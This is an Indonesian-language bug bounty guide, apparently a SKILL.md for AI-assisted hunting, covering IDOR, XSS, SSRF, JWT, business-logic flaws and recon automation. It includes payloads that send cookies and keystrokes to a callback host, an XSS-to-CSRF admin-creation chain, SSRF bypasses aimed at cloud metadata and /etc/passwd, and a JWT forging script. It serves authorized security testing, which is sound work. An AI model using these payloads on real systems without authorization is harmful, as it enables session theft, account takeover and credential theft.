# Bug Bounty SKILL.md v2 — Mindset-Based, Automation-First

---

## ⚡ FILOSOFI UTAMA (Baca ini dulu, selalu)

```
Tool-based hunter:  "Aku run subfinder → ffuf → nuclei → submit"
Mindset-based hunter: "Kenapa endpoint ini ada? Siapa yang akses? 
                       Apa yang terjadi kalau aku jadi user lain?"

Pro hunter bukan yang paling banyak toolnya.
Pro hunter adalah yang paling kreatif dalam bertanya "what if..."
```

### The 3 Questions Before Every Target
```
1. WHAT IF saya bukan siapa yang sistem kira saya?    → Auth / IDOR
2. WHAT IF input saya diproses di server/service lain? → SSRF / SSTI / RCE
3. WHAT IF sistem percaya urutan yang saya manipulasi? → Business Logic / Race Condition
```

---

## MINDSET MODULE — Creative Bug Finding

### The "Attacker Narrative" Technique
Sebelum buka Burp, tanya ke AI dengan prompt ini:

```
Target: [nama app / fitur]
Fitur yang ada: [login, checkout, upload, invite user, dll]

Bayangkan kamu adalah attacker kreatif.
Ceritakan 10 "attack story" — narasi singkat bagaimana seorang 
user jahat bisa menyalahgunakan fitur ini.
Jangan pikirkan teknis dulu. Pikirkan INTENT dan ABUSE CASE.
```

**Contoh output yang diharapkan:**
```
Story 1: "User A invite dirinya sendiri berkali-kali untuk dapat credit gratis"
Story 2: "User A checkout item, batalkan setelah refund diproses tapi barang tetap dikirim"
Story 3: "User A ganti delivery address setelah seller konfirmasi"
```
→ Dari cerita ini, baru kamu tahu MANA yang perlu ditest secara teknis.

### The "Developer Mistake" Framework
```
Prompt ke AI:
"Fitur ini dibangun oleh developer junior di startup yang buru-buru.
Kesalahan apa yang paling mungkin mereka buat?
List 10 developer mistake yang umum untuk fitur: [nama fitur]"
```

### The "What Changed" Technique
```
Program baru update fitur? Itu goldmine.
Prompt: "Fitur [X] baru di-update / dirilis di [app].
Perubahan apa yang biasanya memperkenalkan vulnerability baru?
Apa yang perlu aku test pertama kali?"
```

---

## SPECIALIZATION DEPTH — Per Vulnerability Class

### 🔴 IDOR / Access Control (Deep Mode)

**Mindset:** Bukan soal ganti ID. Soal *siapa yang seharusnya boleh*.

```
Attack Patterns yang Sering Miss:
1. Numeric ID → coba UUID dan vice versa
2. IDOR di indirect reference (filename, slug, hash pendek)
3. IDOR via export/download (PDF, CSV export pakai ID internal)
4. IDOR di webhook / callback URL
5. IDOR setelah role change (upgrade ke premium, lalu downgrade)
6. IDOR di batch API (kirim array of IDs)
7. GraphQL IDOR (query object langsung by ID)
8. IDOR di notification endpoint
```

**Automation Script — IDOR Detector:**
```python
#!/usr/bin/env python3
# idor_probe.py — test IDOR across multiple endpoints

import requests
import json

# Config
BASE_URL = "https://api.example.com"
TOKEN_A = "your_token_user_A"
TOKEN_B = "your_token_user_B"  # different account
USER_B_IDS = {"user_id": "1338", "order_id": "ORD-9999", "invoice": "INV-001"}

ENDPOINTS = [
    "/v1/users/{user_id}/profile",
    "/v1/orders/{order_id}",
    "/v1/invoices/{invoice}",
]

def test_idor(endpoint, id_key, id_val):
    url = BASE_URL + endpoint.replace("{" + id_key + "}", id_val)
    # Test dengan token A mengakses resource user B
    r = requests.get(url, headers={"Authorization": f"Bearer {TOKEN_A}"})
    return {
        "url": url,
        "status": r.status_code,
        "length": len(r.text),
        "snippet": r.text[:200]
    }

for ep in ENDPOINTS:
    for key, val in USER_B_IDS.items():
        if "{" + key + "}" in ep:
            result = test_idor(ep, key, val)
            if result["status"] == 200:
                print(f"[🔴 POSSIBLE IDOR] {result['url']}")
                print(f"    Response: {result['snippet']}\n")
            else:
                print(f"[✅ PROTECTED] {result['url']} → {result['status']}")
```

**Prompt Template — IDOR Deep Analysis:**
```
Saya menemukan endpoint: [METHOD] [URL]
Saya adalah user ID [A], saya bisa akses resource milik user ID [B].

Bantu saya:
1. Tentukan apakah ini true positive atau false positive
2. Apa data paling sensitif yang bisa diakses?
3. Apakah ada lateral movement dari bug ini? (bisa pivot ke bug lain?)
4. Berapa CVSS score yang tepat?
5. Tuliskan impact statement yang compelling untuk laporan
```

---

### 🟠 XSS — Beyond alert(1)

**Mindset:** XSS bukan soal popup. Soal *apa yang bisa kamu lakukan setelah JS jalan*.

```
Impact Ladder (dari rendah ke tinggi):
Level 1: alert(1)                          → Informative / Low
Level 2: document.cookie exfil            → Medium
Level 3: Session hijack + account takeover → High  
Level 4: XSS → CSRF → Admin action       → High/Critical
Level 5: XSS di admin panel → RCE via    → Critical
         admin features (file upload, etc)
```

**Advanced Payloads:**
```javascript
// Exfil cookie ke server kamu
<script>fetch("https://your.interactsh.io/?c="+document.cookie)</script>

// Capture keystrokes
<script>
document.onkeypress=function(e){
  fetch("https://your.interactsh.io/?k="+e.key)
}
</script>

// XSS → CSRF chain
<script>
fetch('/api/v1/admin/users',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({email:'attacker@evil.com',role:'admin'}),
  credentials:'include'
})
</script>

// DOM Clobbering
<form id="config"><input name="token" value="attacker_value"></form>
```

**Automation — XSS Pipeline:**
```bash
#!/bin/bash
# xss_pipeline.sh

TARGET=$1

echo "[*] Collecting endpoints..."
katana -u $TARGET -jc -silent | grep "=" > params.txt
waybackurls $TARGET | grep "=" >> params.txt
sort -u params.txt -o params.txt

echo "[*] Testing XSS with dalfox..."
cat params.txt | dalfox pipe \
  --blind https://your.interactsh.io \
  --skip-bav \
  --output xss_results.txt

echo "[*] Done. Check xss_results.txt"
```

---

### 🟡 SSRF — The Pivot King

**Mindset:** SSRF bukan cuma baca metadata. SSRF adalah pintu ke internal network.

```
SSRF Attack Chain:
Basic SSRF → Internal IP scan → Find internal services → 
→ Hit internal API (no auth) → Escalate to RCE / data dump

Cloud SSRF Chain:
SSRF → AWS metadata (169.254.169.254) → 
→ IAM credentials → AWS CLI access → S3 buckets / EC2 control
```

**Bypass Techniques (penting untuk filter evasion):**
```
Filter bypass arsenal:
http://127.0.0.1          → blocked
http://localhost           → blocked  
http://[::1]              → IPv6 bypass
http://0177.0.0.1         → Octal bypass
http://2130706433         → Decimal bypass
http://127.1              → Short form
http://spoofed.domain.com → DNS rebinding (A record → 127.0.0.1)
http://127.0.0.1.nip.io  → nip.io wildcard DNS

Protocol bypass:
file:///etc/passwd
dict://127.0.0.1:6379/info   → Redis
gopher://127.0.0.1:25/...    → SMTP
ftp://127.0.0.1/
```

**Automation — SSRF Scanner:**
```python
#!/usr/bin/env python3
# ssrf_scan.py

import requests
import subprocess
import time

INTERACTSH_URL = "https://YOUR_ID.oast.fun"
TARGET_PARAMS_FILE = "params_with_urls.txt"

SSRF_PAYLOADS = [
    INTERACTSH_URL,
    f"http://{INTERACTSH_URL}",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://localhost:22",
    "http://[::1]:80",
]

def test_ssrf(url, param, payload):
    try:
        test_url = url.replace(param + "=", param + "=" + payload)
        r = requests.get(test_url, timeout=5, allow_redirects=False)
        return r.status_code, len(r.text)
    except:
        return None, None

with open(TARGET_PARAMS_FILE) as f:
    for line in f:
        url = line.strip()
        # simple: find URL-like params
        if "url=" in url or "redirect=" in url or "src=" in url or "path=" in url:
            for payload in SSRF_PAYLOADS:
                for param in ["url", "redirect", "src", "path", "endpoint", "webhook"]:
                    if param + "=" in url:
                        status, length = test_ssrf(url, param, payload)
                        if status:
                            print(f"[TEST] {url[:80]} | {param}={payload[:30]} | {status} | {length}b")
```

---

### 🔵 Auth Bypass / JWT

**Mindset:** Auth bypass bukan cuma "skip login". Soal *siapa yang sistem percaya*.

```
Attack Vectors:
1. JWT algorithm confusion (RS256 → HS256)
2. JWT "none" algorithm
3. JWT secret brute force (hashcat)
4. JWT kid injection (SQLi / path traversal in kid field)
5. Password reset poisoning (Host header injection)
6. OAuth misconfig (redirect_uri not validated)
7. 2FA bypass (skip step, race condition, brute force)
8. Session fixation
9. Token predictability (sequential, timestamp-based)
10. Cookie scope issues (domain=.example.com)
```

**JWT Attack Script:**
```python
#!/usr/bin/env python3
# jwt_attack.py

import jwt
import base64
import json
import hmac
import hashlib

def decode_jwt(token):
    """Decode tanpa verify"""
    parts = token.split('.')
    header = json.loads(base64.b64decode(parts[0] + "=="))
    payload = json.loads(base64.b64decode(parts[1] + "=="))
    return header, payload

def forge_none_alg(token):
    """Try none algorithm"""
    header, payload = decode_jwt(token)
    header['alg'] = 'none'
    
    new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    return f"{new_header}.{new_payload}."

def forge_hs256_with_public_key(token, public_key):
    """RS256 → HS256 confusion attack"""
    header, payload = decode_jwt(token)
    header['alg'] = 'HS256'
    
    return jwt.encode(payload, public_key, algorithm='HS256',
                     headers=header)

# Usage
TOKEN = "eyJ..."
print("[none alg]", forge_none_alg(TOKEN))
```

**Prompt Template — Auth Deep Dive:**
```
Saya menemukan login/auth flow berikut:
[describe flow: login → 2FA → session → etc]

Ini adalah response header dari server:
[paste headers]

Ini adalah JWT token saya:
[paste token]

Bantu saya:
1. Decode dan analisis JWT claims — ada yang aneh?
2. List semua attack vector yang applicable untuk flow ini
3. Urutan mana yang paling likely berhasil?
4. Kalau berhasil bypass, apa dampaknya ke seluruh sistem?
```

---

### 🟢 Business Logic — The Unscannerable

**Mindset:** Scanner tidak bisa nemuin ini. Otak kamu satu-satunya tool.

```
Pattern Library:

💰 Financial Logic:
- Negative quantity → negative charge (refund without purchase)
- Price manipulation in transit (intercept & modify)
- Coupon stacking / reuse after use
- Race condition on withdrawal / transfer
- Rounding errors (0.001 cent × 1M transactions)

👥 Privilege Logic:
- Feature access after downgrade (still has premium features)
- Invite yourself with different role
- Object created with user A, transferred to user B, A still controls
- Admin feature accessible without admin header

⏱️ Time/State Logic:
- Race condition on "one-time" actions
- TOCTOU (Time of Check, Time of Use)
- Expired offer still accepted
- Order modification after payment confirmed
```

**Race Condition Script:**
```python
#!/usr/bin/env python3
# race_condition.py — send N requests simultaneously

import asyncio
import aiohttp
import time

TARGET_URL = "https://example.com/api/redeem-coupon"
TOKEN = "your_auth_token"
PAYLOAD = {"coupon_code": "SAVE50", "order_id": "ORD-123"}
CONCURRENT = 20  # jumlah request simultan

async def send_request(session, i):
    async with session.post(
        TARGET_URL,
        json=PAYLOAD,
        headers={"Authorization": f"Bearer {TOKEN}"}
    ) as resp:
        body = await resp.text()
        print(f"[{i}] Status: {resp.status} | Response: {body[:100]}")

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, i) for i in range(CONCURRENT)]
        # Fire semua request bersamaan
        await asyncio.gather(*tasks)

print(f"[*] Firing {CONCURRENT} concurrent requests...")
start = time.time()
asyncio.run(race())
print(f"[*] Done in {time.time()-start:.2f}s")
```

---

## AUTOMATION PIPELINE — Full Recon to Report

### Master Recon Pipeline
```bash
#!/bin/bash
# recon_pipeline.sh — full automated recon
# Usage: ./recon_pipeline.sh example.com

DOMAIN=$1
OUTPUT_DIR="./recon_$DOMAIN"
mkdir -p $OUTPUT_DIR

echo "[Phase 1] Subdomain Enumeration..."
subfinder -d $DOMAIN -silent -o $OUTPUT_DIR/subs_passive.txt
amass enum -passive -d $DOMAIN -o $OUTPUT_DIR/subs_amass.txt
cat $OUTPUT_DIR/subs_*.txt | sort -u > $OUTPUT_DIR/all_subs.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/all_subs.txt) subdomains"

echo "[Phase 2] HTTP Probing..."
cat $OUTPUT_DIR/all_subs.txt | httpx -silent \
  -status-code -title -tech-detect -content-length \
  -o $OUTPUT_DIR/live_hosts.txt
echo "[+] Live hosts: $(wc -l < $OUTPUT_DIR/live_hosts.txt)"

echo "[Phase 3] Endpoint Discovery..."
cat $OUTPUT_DIR/live_hosts.txt | awk '{print $1}' | \
  katana -jc -silent -o $OUTPUT_DIR/endpoints.txt

echo "[Phase 4] Parameter Collection..."
cat $OUTPUT_DIR/live_hosts.txt | awk '{print $1}' | \
  waybackurls | grep "=" | sort -u > $OUTPUT_DIR/params.txt

echo "[Phase 5] JS Secret Scanning..."
cat $OUTPUT_DIR/endpoints.txt | grep "\.js$" | \
  xargs -I{} sh -c 'curl -s "{}"' | \
  trufflehog filesystem --no-git /dev/stdin 2>/dev/null \
  > $OUTPUT_DIR/js_secrets.txt

echo "[Phase 6] Nuclei Scan..."
nuclei -list $OUTPUT_DIR/live_hosts.txt \
  -t ~/nuclei-templates/ \
  -severity medium,high,critical \
  -o $OUTPUT_DIR/nuclei_results.txt \
  -silent

echo ""
echo "=== RECON COMPLETE: $DOMAIN ==="
echo "Subdomains : $(wc -l < $OUTPUT_DIR/all_subs.txt)"
echo "Live hosts : $(wc -l < $OUTPUT_DIR/live_hosts.txt)"
echo "Endpoints  : $(wc -l < $OUTPUT_DIR/endpoints.txt)"
echo "Parameters : $(wc -l < $OUTPUT_DIR/params.txt)"
echo "Output dir : $OUTPUT_DIR/"
```

### AI-Assisted Triage Pipeline
```bash
# Setelah recon selesai, kasih hasilnya ke AI

cat recon_example.com/live_hosts.txt | claude "
Ini adalah hasil recon untuk program bug bounty example.com.
Analisis dan prioritaskan:
1. Subdomain mana yang paling menarik (staging, dev, api, admin)?
2. Teknologi apa yang terdeteksi dan vulnerability apa yang sering ada?
3. Buatkan ranked list target dari paling tinggi ke rendah prioritasnya
Format: [Priority] [URL] [Reason] [Suggested first test]
"
```

---

## REAL EXPERIENCE BUILDER — Cara Dapat First Payout

### Step 1: Build "Evidence of Thinking" (bukan cuma laporan)

Setiap hunting session, dokumentasikan:
```markdown
## Hunting Session — [Tanggal]
**Target:** example.com
**Durasi:** 3 jam

### Yang sudah dicoba:
- [ ] IDOR di /api/orders → Protected ✅
- [ ] XSS di search param → Filtered, bypass failed
- [x] SSRF di webhook URL → **POSITIVE** 🔴

### Thought process:
"Saya perhatikan fitur webhook menerima URL apapun tanpa validasi.
Saya coba hit internal IP dan dapat response dari metadata AWS."

### Evidence:
[screenshot / curl output]
```

Ini yang ChatGPT sebut "real experience" — dokumentasi thinking process kamu.

### Step 2: Build Private Writeup untuk Setiap Bug (Walau Ditolak)

```
Prompt:
"Bantu saya tulis private writeup untuk bug ini.
Bukan untuk dipublish, tapi untuk portfolio dan belajar.

Bug: [describe]
Kenapa menarik: [explain]
Yang saya pelajari: [lessons]

Format seperti writeup HackerOne yang bagus."
```

### Step 3: Focus Area per Week

```
Senin-Selasa  : Recon + endpoint collection
Rabu-Kamis    : Deep dive satu vuln class per program
Jumat         : Report writing + review
Sabtu         : Baca disclosed reports (5 laporan)
Minggu        : Automation improvement
```

---

## PROMPT MASTER TEMPLATES

### Template 1 — Start Session
```
Kamu adalah senior bug bounty hunter dengan mindset-first approach.

Target : [program name]
Scope  : [paste scope]
Phase  : [current phase]
Context: [apa yang sudah ditemukan]

Sebelum kasih checklist tools, bantu saya dulu:
1. Apa "attack narrative" yang paling menarik untuk target ini?
2. Sebagai developer yang membangun sistem ini, kesalahan apa yang 
   paling mungkin mereka buat?
3. Baru setelah itu: apa langkah teknis pertama?
```

### Template 2 — Analyze Anomaly
```
Saya menemukan sesuatu yang aneh:
[describe anomaly — response berbeda, parameter tidak biasa, dll]

Ini raw request/response:
[paste]

Bantu saya:
1. Apakah ini bisa jadi vulnerability?
2. Kalau iya, vuln class apa?
3. Bagaimana cara membuktikan impact-nya?
4. Langkah exploit selanjutnya?
```

### Template 3 — Before Submit Report
```
Review laporan bug bounty saya sebelum saya submit:

[paste full report]

Check:
1. Apakah reproducible tanpa ambiguitas?
2. Apakah severity/CVSS justified?
3. Apakah impact understated atau overstated?
4. Apa yang mungkin triager pertanyakan?
5. Ada bukti tambahan yang sebaiknya saya sertakan?
```

### Template 4 — Rejected Report Recovery
```
Laporan saya ditolak/dirating informative dengan alasan:
"[paste triager response]"

Laporan asli saya:
[paste]

Bantu saya:
1. Apakah keputusan mereka valid?
2. Bukti tambahan apa yang bisa saya berikan?
3. Bagaimana cara merespons secara profesional?
4. Apa yang bisa saya pelajari dari rejection ini?
```

---

## CHEATSHEET CEPAT

```
Recon stack   : subfinder → httpx → katana → waybackurls
Fuzzing       : ffuf (dirs) + arjun (params) + dalfox (xss)
Scanning      : nuclei (templates) + sqlmap (sqli)
Listening     : interactsh (SSRF/blind callbacks)
Proxy         : Burp Suite (manual testing hub)
Automation    : Python aiohttp (race) + bash pipeline

Severity guide:
Critical : RCE, SQLi mass dump, Account Takeover tanpa interaksi
High     : IDOR sensitif, Stored XSS, SSRF internal, Auth bypass
Medium   : Reflected XSS, IDOR non-sensitif, Info disclosure sensitif
Low      : Self-XSS, Open redirect, Rate limit bypass ringan
Info     : Tidak ada impact nyata (biasanya no payout)

Payout mindset:
Bukan soal banyak bug → soal IMPACT per bug
1 Critical = lebih baik dari 10 Low
Business logic bug = sedikit saingan, high reward
```

---

## REFERENSI WAJIB BACA

```
Disclosed reports (baca 5/minggu):
https://hackerone.com/hacktivity?order_direction=DESC&filter=type%3Apublic

Writeup terbaik:
https://pentester.land/list-of-bug-bounty-writeups.html
https://github.com/ngalongc/bug-bounty-reference

Lab practice:
https://portswigger.net/web-security (GRATIS — wajib)
https://www.hackthebox.com (web challenges)

Methodology:
https://book.hacktricks.xyz
https://github.com/swisskyrepo/PayloadsAllTheThings

Untuk automation:
https://github.com/projectdiscovery (tool suite terbaik)
https://github.com/tomnomnom (tooling minimalis tapi powerful)
```
